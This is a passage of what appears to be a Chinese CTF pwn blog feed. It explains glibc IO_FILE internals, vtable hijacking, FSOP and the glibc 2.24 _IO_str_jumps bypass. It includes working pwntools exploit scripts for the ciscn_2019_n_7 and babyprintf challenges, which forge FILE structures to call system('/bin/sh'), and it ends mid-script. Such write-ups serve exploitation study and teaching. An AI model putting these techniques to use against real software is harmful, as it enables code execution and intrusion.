bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE相关利用</title>
      <link href="2021/07/27/IO-FILE/"/>
      <url>2021/07/27/IO-FILE/</url>
      
        <content type="html"><![CDATA[<p>总结自ctfwiki</p><h2 id="IO-FILE相关知识"><a href="#IO-FILE相关知识" class="headerlink" title="IO_FILE相关知识"></a>IO_FILE相关知识</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>_IO_list_all是_IO_FILE_plus类型的一个指针<br><code>extern struct _IO_FILE_plus *_IO_list_all</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>在第一部分， file 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。file结构在程序执行，fread、fwrite 等标准函数需要文件流指针来指引去调用虚表函数。特殊地， fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 file结构的指针来接收这个返回值。</p><p>在第二部分，刚刚谈到的虚表就是 _IO_jump_t 结构体，在此虚表中，有很多函数都调用其中的子函数，无论是关闭文件，还是报错输出等等，都有对应的字段，而这正是可以攻击者可以被利用的突破口。值得注意的是，在 _IO_list_all 结构体中，_IO_FILE 结构是完整嵌入其中，而 vtable 是一个虚表指针，它指向了 _IO_jump_t 结构体。一个是完整的，一个是指针，这点一定要切记。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>借用之前总结的<br><img src="https://l3mon629.github.io/post-images/1600588419695.png" alt=""></p><h3 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h3><p>听星盟师傅讲的公开课，推荐了raycp师傅的博客，IOFILE这一部分根据师傅的博客来复现总结一下</p><p>采取libc version为2.23</p><p>以fopen为例分析一个file函数的执行流程</p><h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h4><p>fopen实际上是_IO_new_fopen函数</p><p>定义位置为/libio/iofopen.c的34行</p><p><code>define _IO_new_fopen fopen</code></p><p>源码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>步入到__fopen_internal函数 源码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br><span class="line">  <span class="comment">// 分配一块sizeof(struct locked_FILE)大小的空间来装结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">// 初始化操作</span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_file_init (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据师傅的总结如下</p><blockquote><p>整个<code>__fopen_internal</code>函数包含四个部分：</p><ol><li><code>malloc</code>分配内存空间。</li><li><code>_IO_no_init</code> 对file结构体进行<code>null</code>初始化。</li><li><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表。</li><li><code>_IO_file_fopen</code>执行系统调用打开文件。</li></ol></blockquote><h5 id="分配内存空间"><a href="#分配内存空间" class="headerlink" title="分配内存空间"></a>分配内存空间</h5><p>首先分配了一块内存空间来装locked_FILE结构体</p><p>结构体成员为_IO_FILE_plus，_IO_lock_t和_IO_wide_data类型的变量</p><p><img src="https://i.loli.net/2021/08/02/L7F2VPznYpkWfy9.png" alt=""></p><h5 id="IO-no-init对结构体初始化"><a href="#IO-no-init对结构体初始化" class="headerlink" title="_IO_no_init对结构体初始化"></a>_IO_no_init对结构体初始化</h5><p><img src="https://i.loli.net/2021/08/02/YGiPwth9po17WS2.png" alt=""></p><p>初始化成员fp（_IO_FILE_plus）的值，大部分都为null</p><h5 id="结构体链入-IO-list-all"><a href="#结构体链入-IO-list-all" class="headerlink" title="结构体链入_IO_list_all"></a>结构体链入_IO_list_all</h5><p>接下来执行_IO_file_init函数</p><p><img src="https://i.loli.net/2021/08/02/EAokLgltTYJQj7v.png" alt=""></p><p>重要的是调用了link in函数，看名字就知道应该是这个函数操作了链入</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_link_in (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 改fp的chain链</span></span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">    <span class="comment">// 改_IO_list_all</span></span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改之前：_IO_list_all指向stderr</p><p><img src="https://i.loli.net/2021/08/02/fRN9FUO1ViJCPwA.png" alt=""></p><p>做完link in操作后：_IO_list_all指向fp，fp._chain指向stderr</p><p><img src="https://i.loli.net/2021/08/02/fpmKdFRYo6VeTh5.png" alt=""></p><h5 id="IO-file-fopen打开文件句柄"><a href="#IO-file-fopen打开文件句柄" class="headerlink" title="_IO_file_fopen打开文件句柄"></a>_IO_file_fopen打开文件句柄</h5><p>首先会进入_IO_new_file_fopen函数</p><p><img src="https://i.loli.net/2021/08/02/cQstGUBLpAwv6hZ.png" alt="6.png"></p><p>设置文件的模式之类的操作</p><p>随后调用_IO_file_fopen函数</p><p><img src="https://i.loli.net/2021/08/02/NmaZu78cxrlTMXK.png" alt=""></p><p>_IO_file_fopen函数主要是调用了open系统调用，并且将文件描述符返回给fd的fileno字段</p><p><img src="https://i.loli.net/2021/08/02/NmaZu78cxrlTMXK.png" alt=""></p><p>执行完函数，观察fileno字段已被填入正确的文件描述符，文件正常打开</p><p><img src="https://i.loli.net/2021/08/02/lYn69xwXPWiMbVK.png" alt=""></p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>fopen首先申请内存，初始化结构体，然后链入链表，最后调用系统调用打开文件</p><h2 id="伪造vtable劫持程序流程"><a href="#伪造vtable劫持程序流程" class="headerlink" title="伪造vtable劫持程序流程"></a>伪造vtable劫持程序流程</h2><p>由于linux中一些常见的IO操作函数都需要经过FILE结构处理，尤其是_IO_FILE_plus结构中存在vtable，一些函数会去除vtable中的指针进行调用。<br>伪造vtable劫持程序的中心思想就是针对_IO_FILE_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中布置函数指针来实现，覆盖vtable的指针指向我们控制的内存，然后在其中布置函数指针(反正就是控制指针就完了嗷)</p><p>看如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看内存分布</p><p><img src="https://i.loli.net/2021/08/02/9m2r1GLTNScKxEJ.png" alt=""></p><p>找到vtable的偏移然后改掉我们控制的一片内存空间，再在内存空间里相应位置的地方改成system之类的函数即可控制程序流</p><p><img src="https://i.loli.net/2021/08/02/uWgdeUJlqL9kAc1.png" alt=""></p><h3 id="vtable函数的调用情况"><a href="#vtable函数的调用情况" class="headerlink" title="vtable函数的调用情况"></a>vtable函数的调用情况</h3><p>调用情况如下：</p><blockquote><p>fopen函数是在分配空间，建立FILE结构体，未调用vtable中的函数。</p><p>fread函数中调用的vtable函数有：</p><ul><li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。</li><li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。</li><li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。</li></ul><p>fwrite 函数调用的vtable函数有：</p><ul><li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li><li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li><li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li></ul><p><code>fclose</code>函数调用的vtable函数有：</p><ul><li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。</li><li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。</li><li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数。</li></ul></blockquote><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP = File Stream Oriented Programming</p><p>关键点：_IO_list_all指针</p><p>在没有涉及到文件的操作时，链表是这样的：_IO_list_all -&gt; stderr，stderr._chain -&gt; stdout，stdout._chain -&gt; stdin，FSOP就是伪造一块_IO_FILE_plus结构体代替原本的节点，再利用漏洞修改_IO_list_all的值为可控的内存区域</p><p>伪造之后还需要触发，触发的方法是调用_IO_flush_all_lockp函数，这个函数会刷新链表中的文件流，相当于对每个FILE调用fflush，对应会调用vtable中的_IO_overflow</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="comment">// 判断缓冲区是否有数据，有则刷新</span></span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在如下情况中这个函数会被系统调用</p><ol><li>libc执行abort时</li><li>执行exit函数时</li><li>main函数返回时（执行了exit函数）</li></ol><h3 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h3><p>漏洞是可以溢出覆盖heap manager的指针，也就是相当于任意地址写</p><p>思路就是将指针写为stderr，然后直接在stderr中写，把某些字段改成system地址，vtable改为这个字段的地址-0x18（vtable的第四个字段为overflow）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">backdoor()</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(re(<span class="number">12</span>, <span class="number">0</span>), base=<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc.address = leak</span><br><span class="line">echo(<span class="built_in">hex</span>(leak))</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">1</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) * <span class="number">0x4</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>] + <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">&quot;lemon\x00\x00\x00&quot;</span> + p64(libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>]))</span><br><span class="line">edit(<span class="string">&quot;lemon&quot;</span>, payload)</span><br><span class="line">ru(menu)</span><br><span class="line">sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>人为需要计算一下，可以使用pwn_debug，使得exp构造更简单一些</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">backdoor()</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(re(<span class="number">12</span>, <span class="number">0</span>), base=<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc.address = leak</span><br><span class="line">echo(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">fake_file = IO_FILE_plus()</span><br><span class="line">fake_file._flags = <span class="number">0x0068732f6e69622f</span></span><br><span class="line">fake_file._IO_write_ptr = <span class="number">1</span> </span><br><span class="line">fake_file._IO_write_base = <span class="number">0</span></span><br><span class="line">fake_file._IO_save_end = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">fake_file.vtable = libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>] + <span class="number">0x40</span></span><br><span class="line">fake_file.show()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">&quot;lemon\x00\x00\x00&quot;</span> + p64(libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>]))</span><br><span class="line">edit(<span class="string">&quot;lemon&quot;</span>, <span class="built_in">str</span>(fake_file))</span><br><span class="line">ru(menu)</span><br><span class="line">sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="glibc2-24新增保护"><a href="#glibc2-24新增保护" class="headerlink" title="glibc2.24新增保护"></a>glibc2.24新增保护</h2><h5 id="IO-str-jump地址确定"><a href="#IO-str-jump地址确定" class="headerlink" title="_IO_str_jump地址确定"></a>_IO_str_jump地址确定</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p _IO_str_underflow</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">    &lt;text variable, no debug info&gt;&#125; <span class="number">0x7f4d4cf04790</span> &lt;_IO_str_underflow&gt;</span><br><span class="line">pwndbg&gt; search -p <span class="number">0x7f4d4cf04790</span></span><br><span class="line">libc.so<span class="number">.6</span>       <span class="number">0x7f4d4d2240a0</span> <span class="number">0x7f4d4cf04790</span></span><br><span class="line">libc.so<span class="number">.6</span>       <span class="number">0x7f4d4d224160</span> <span class="number">0x7f4d4cf04790</span></span><br><span class="line">libc.so<span class="number">.6</span>       <span class="number">0x7f4d4d2245e0</span> <span class="number">0x7f4d4cf04790</span></span><br><span class="line">pwndbg&gt; p &amp;_IO_file_jumps</span><br><span class="line">$<span class="number">2</span> = (&lt;data variable, no debug info&gt; *) <span class="number">0x7f4d4d224440</span> &lt;_IO_file_jumps&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        <span class="built_in">print</span> possible_IO_str_jumps_offset</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>在 2.24 版本的 glibc 中，全新加入了针对 _IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p><p><code>__start___libc_IO_vtables</code>指向第一个vtable地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个vtable<code>_IO_str_chk_jumps</code>结束的地址，所以要保证利用的手法在这个vtable段中。</p><p>直接写出利用手法如下：</p><blockquote><p>fp-&gt;_mode = 0</p><p>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</p><p>fp-&gt;_IO_read_ptr = 0x61（smallbin size）</p><p>fp-&gt;_IO_read_base = _IO_list_all - 0x10</p><p>上面是做HOO的时候可以用到的tips</p><p>vtable = _IO_str_jumps - 8（使得_IO_str_finish函数成为了伪造的vtable的_IO_OVERFLOW，<code>_IO_str_finish</code>偏移为<code>_IO_str_jumps</code>中0x10，而<code>_IO_OVERFLOW</code>为0x18）</p><p>fp-&gt;_flags的最低位为0</p><p>fp-&gt;_IO_buf_base = binsh_addr（作为参数）</p><p>fp-&gt;_s._free_buffer = system 或者 og（fp + 0xe8）</p></blockquote><p>通过以上构造可以使得调用<code>(fp-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>，<code>fp-&gt;_IO_buf_base</code>为第一个参数</p><h3 id="babyprintf"><a href="#babyprintf" class="headerlink" title="babyprintf"></a>babyprintf</h3><p>无限堆溢出，按照如上的构造方法来构造即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug.pwn_debug <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn_debug.IO_FILE_plus <span class="keyword">import</span> *</span><br><span class="line">pdbg=pwn_debug(<span class="string">&quot;babyprintf&quot;</span>)</span><br><span class="line"></span><br><span class="line">pdbg.context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pdbg.local()</span><br><span class="line">pdbg.debug(<span class="string">&quot;2.24&quot;</span>)</span><br><span class="line">pdbg.remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">22</span>)</span><br><span class="line"><span class="comment">#p=pdbg.run(&quot;local&quot;)</span></span><br><span class="line"><span class="comment">#p=pdbg.run(&quot;remote&quot;)</span></span><br><span class="line">p=pdbg.run(<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">membp=pdbg.membp</span><br><span class="line"><span class="comment">#print type(pdbg.membp)</span></span><br><span class="line"><span class="comment">#print hex(membp.elf_base),hex(membp.libc_base)</span></span><br><span class="line">elf=pdbg.elf</span><br><span class="line">libc=pdbg.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_one</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;string: &quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;result: &quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#pdbg.bp([0x4007f0])</span></span><br><span class="line">    <span class="comment"># step 1 leaking libc address and overwrite top chunk size</span></span><br><span class="line">    data=<span class="string">&quot;%p%p%p%p%p**%p**&quot;</span></span><br><span class="line">    data=data.ljust(<span class="number">0x2f8</span>,<span class="string">&#x27;*&#x27;</span>)+p64(<span class="number">0xd01</span>)</span><br><span class="line">    write_one(<span class="number">0x2f0</span>,data)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;**&quot;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;**&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">    io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    io_str_jumps=libc_base+libc.symbols[<span class="string">&#x27;_IO_str_jumps&#x27;</span>]</span><br><span class="line">    binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;leaking libc base: %s&quot;</span>%<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="comment">#pdbg.bp()</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 2 trigger sysmalloc</span></span><br><span class="line">    write_one(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    fake_file=IO_FILE_plus()</span><br><span class="line">    fake_file._IO_read_ptr=<span class="number">0x61</span></span><br><span class="line">    fake_file._IO_read_base=io_list_all-<span class="number">0x10</span></span><br><span class="line">    fake_file._IO_buf_base=binsh_addr</span><br><span class="line">    fake_file._IO_write_ptr=<span class="number">1</span></span><br><span class="line">    fake_file.vtable=io_str_jumps-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    fake_file.show()</span><br><span class="line">    fake_file.str_finish_check()</span><br><span class="line">    file_data=<span class="built_in">str</span>(fake_file)+p64(system_addr)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span 